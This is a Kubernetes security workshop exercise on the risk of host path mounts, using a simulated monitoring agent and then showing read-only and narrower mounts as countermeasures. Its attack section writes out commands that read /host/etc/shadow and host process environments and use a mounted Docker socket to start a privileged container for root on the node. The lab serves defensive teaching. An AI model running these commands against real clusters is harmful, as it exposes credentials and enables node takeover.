+++
categories = []
date = "2020-02-20"
description = ""
slug = ""
tags = []
title = "Read-only host mounts"
draft = false
toc = true
weight = 15
+++

### Introduction
In this exercise, we cover:

 - The risk of host mounts
 - How to use read-only mounts if they suffice

### Setup
In this example, we'll just directly use a shell inside the app.
Our example app will be a simulated monitoring agent mounting the same paths as the [Datadog DaemonSet](https://docs.datadoghq.com/agent/kubernetes/daemonset_setup/?tab=k8sfile):
```
volumeMounts:
  - {name: dockersocket, mountPath: /var/run/docker.sock}
  - {name: procdir, mountPath: /host/proc, readOnly: true}
  - {name: cgroups, mountPath: /host/sys/fs/cgroup, readOnly: true}
  - {name: s6-run, mountPath: /var/run/s6}
  - {name: logpodpath, mountPath: /var/log/pods}
  ## Docker runtime directory, replace this path with your container runtime
  ## logs directory, or remove this configuration if `/var/log/pods`
  ## is not a symlink to any other directory.
  - {name: logcontainerpath, mountPath: /var/lib/docker/containers}
```

We'll also mount `/etc` itself for extra fun.

Let's deploy our simulated agent:

```
kubectl apply -f https://securek8s.dev/agent/base.yaml
```

<!-- TODO: note that you read env vars with this mount, even if read-only. Also, the Docker socket—scream! -->

### Attack
With our power to execute commands, we'll see what types of files we
could modify, and what sorts of access they could provide.

Find a pod:
```
kubectl get po -n mounts
```

Then get into it:
```
kubectl exec -it -n mounts <pod> bash
```

Now, try some host modifications and information gathering attempts:

```
touch /host/etc/flag
cat /host/etc/shadow
ls /host/proc/
cat /host/proc/*/cmdline
cat /host/proc/1/cmdline
ls -alh /host/proc/1/environ
```

Note that our host info is different from our container's:

```
cat /proc/1/cmdline
```

What else can you come up with?

Note that this deployment is extra-dangerous because it mounts the Docker socket.
That's a great way for your container to have effectively root privileges on the node.

Let's see what we can do:

```
apt-get update
apt-get install -y curl
curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
./docker/docker ps
./docker/docker run --rm -it --privileged ubuntu
```

Use ctrl-D to exit once you've finished poking around.
(Now you're back in the pod.)

Let's use some of the other mounts. For instance, we could spy on other containers' logs:
```
ls /var/log/pods
```

Pick a pod you're interested in, then see what you can learn from the logs.

### Countermeasure
We can:

 - Remove some mount paths our application doesn't need,
 - Mark some of our mounts read-only, and
 - Mount more specific paths,

depending on the access we actually need.

This can require a bit of application knowledge, so is often best done with the team that maintains or operates the app.

Let's see what our improved deployment changes:

```
kubectl diff -f https://securek8s.dev/agent/improved.yaml
```

Then let's deploy it:

```
kubectl apply -f https://securek8s.dev/agent/improved.yaml
```

Find a pod:
```
kubectl get po -n mounts
```

Then get into it:
```
kubectl exec -it -n mounts <pod> bash
```

### Attack effects after patching
You can't mess with stuff if you can't write to it, or
find out information you can't read!

Note that the Docker socket [still **does** work](https://news.ycombinator.com/item?id=17983623) despite us mounting it read-only:

```
apt-get update
apt-get install curl
curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
./docker/docker ps
./docker/docker run --rm -it --privileged ubuntu
```

If we try some of the same manipulations we tried earlier, they'll fail.

### How to use it yourself
If you use an application that needs to know something about the host,
you might need to mount a host path.

You can minimize the risk that such mounts poses by:

 - marking them read-only, and
 - minimizing the mount surface to just what's required.

Note, when you're slimming down mounts: container runtimes will sometimes _create_ files on your host
if they do not exist, which can be a problem if you want to mount
a path that might not exist.
This is particularly annoying when you try to mount a specific file
and the runtime creates a directory.

### Next up
We'll pivot to network policies in the next exercise:

[**Network policies**](../20-netpol)
